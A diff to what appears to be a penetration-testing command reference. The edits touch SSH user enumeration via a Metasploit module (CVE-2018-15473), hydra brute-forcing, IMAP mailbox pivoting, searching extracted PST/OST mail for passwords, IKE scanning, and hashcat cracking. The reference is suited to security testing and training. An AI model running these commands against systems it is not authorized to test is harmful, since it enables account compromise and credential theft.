@@ -560,8 +560,9 @@ ssh -o PreferredAuthentications=none -o ConnectTimeout=5 user@<IP> 2>&1
 # Supported algorithms (look for weak ciphers)
 nmap -p 22 --script ssh2-enum-algos -Pn <IP>
 
-# User enumeration (CVE-2018-15473 — OpenSSH < 7.7)
-python3 ssh_user_enum.py --port 22 --userlist users.txt <IP>
+# User enumeration (CVE-2018-15473 — OpenSSH ≤ 7.7, fixed in 7.8)
+# Use Metasploit's auxiliary module (no external tool fetch required)
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <IP>; set USER_FILE users.txt; run; exit"
 
 # Brute-force
 hydra -L users.txt -P passwords.txt ssh://<IP> -t 4
@@ -853,13 +854,13 @@ b SELECT INBOX
 c LIST "" *
 c NAMESPACE
 
-# Pivot to non-Inbox folders (where the real data lives)
-d SELECT Drafts
-d SELECT Sent
-d SELECT "Sent Items"
-d SELECT Trash
-d SELECT Junk
-d SELECT Archive
+# Pivot to non-Inbox folders (where the real data lives) — IMAP requires unique tags per command
+d1 SELECT Drafts
+d2 SELECT Sent
+d3 SELECT "Sent Items"
+d4 SELECT Trash
+d5 SELECT Junk
+d6 SELECT Archive
 
 # Enumerate messages in selected folder
 e SEARCH ALL
@@ -948,15 +949,25 @@ grep -RiE 'password|credential' pst_out/Sent\ Items/ pst_out/Drafts/ pst_out/Del
 readpst -tea -m -o ost_out/ <FILE>.ost
 
 # Fallback when readpst rejects the OST format
-# https://github.com/libratom/libratom
-pip install libratom
-ratom-extract <FILE>.ost -o ost_out/
+# Repo: https://github.com/libratom/libratom
+pipx install libratom            # PEP 668 distros (Kali 2023+); else: pip install --user libratom
+ratom emldump --out ost_out/ <FILE>.ost
 ```
 
 ```bash
-# Structured triage - JSON for jq filtering
-# https://github.com/mattgwwalker/msg-extractor
-pst2json <FILE>.pst > emails.json
+# Structured triage — readpst → mbox → JSON for jq filtering
+# readpst ships in Kali (libpst-tools); converts PST to mbox per folder
+readpst -tea -m -o /tmp/pst_out <FILE>.pst
+python3 -c '
+import mailbox, json, os, sys
+out=[]
+for f in os.listdir("/tmp/pst_out"):
+    p=os.path.join("/tmp/pst_out", f)
+    if not os.path.isfile(p): continue
+    for m in mailbox.mbox(p):
+        out.append({"subject":m.get("Subject",""),"from":m.get("From",""),"to":m.get("To",""),"date":m.get("Date",""),"body":m.get_payload(decode=False) if isinstance(m.get_payload(),str) else ""})
+print(json.dumps(out))
+' > emails.json
 jq '.[] | select(.body | test("password";"i")) | {subject, from, to, date, body}' emails.json
 jq '.[] | select(.subject | test("password|credential|VPN|reset";"i"))' emails.json
 ```
@@ -997,8 +1008,9 @@ grep -RiB2 -A2 'password.*(is|has been|changed|reset|new)' /tmp/loot/*.eml
 
 ```bash
 # extract_msg (Python — if already installed on the pentest distro)
+# CLI name varies by installer: try `extract_msg` first, fall back to `extract-msg`
 # Extracts headers, body text, HTML body, and all attachments into a per-message folder
-extract_msg <FILE>.msg
+extract_msg <FILE>.msg     # OR: extract-msg <FILE>.msg  (depending on installer)
 extract_msg <FILE>.msg -o /tmp/msg_out/
 
 # Batch extraction
@@ -1851,6 +1863,7 @@ ike-scan -M <TARGET>
 ike-scan -M --nat-t <TARGET>
 
 # Try every transform combination — useful when default handshake fails
+# --trans format: enc,hash,auth,group  (key-size after / for AES variants, e.g. 7/256)
 ike-scan -M --trans=5,2,1,2 <TARGET>     # 3DES/SHA1/PSK/MODP1024
 ike-scan -M --trans=7/256,2,1,5 <TARGET> # AES-256/SHA1/PSK/MODP1536
 
@@ -2276,7 +2289,8 @@ hashcat -m <MODE> -a 3 hashes.txt ?u?l?l?l?l?l?d?d
 # Combinator (combine two wordlists)
 hashcat -m <MODE> -a 1 hashes.txt wordlist1.txt wordlist2.txt
 
-# Show cracked hashes (after --potfile stores them)
+# Show cracked hashes (reads from $HASHCAT_POTFILE — default ~/.hashcat/hashcat.potfile;
+# use --potfile-disable to skip the potfile or --potfile-path to override)
 hashcat -m <MODE> hashes.txt --show
 
 # Ignore username field in dump output (format: user:hash)
